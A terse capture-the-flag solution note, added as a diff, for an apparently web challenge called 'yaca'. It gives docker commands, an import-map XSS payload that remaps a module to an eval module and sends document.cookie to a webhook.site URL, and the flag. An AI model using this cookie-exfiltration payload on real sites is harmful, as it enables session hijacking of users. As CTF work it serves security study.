@@ -1,0 +1,14 @@
+docker build -t yaca .
+docker run -p 140.113.24.143:3838:3838 yaca
+
+https://github.com/WICG/import-maps
+```
+<script id="program" language="json" type="importmap">
+  {"imports":{"/js/ast-to-js.mjs":"/js/eval-code.mjs"},"name":"give me the flag pls~~","code":"{\"code\": \"new Image().src=\\\"https://webhook.site/a3813c44-9f1e-4f0f-9dc8-xxx/?leak=\\\" + encodeURIComponent(document.cookie)\", \"variables\": []}"}
+</script>
+```
+
+python3 solve.py
+```
+pctf{someone_should_document_importmaps_in_mdn_probably}
+```
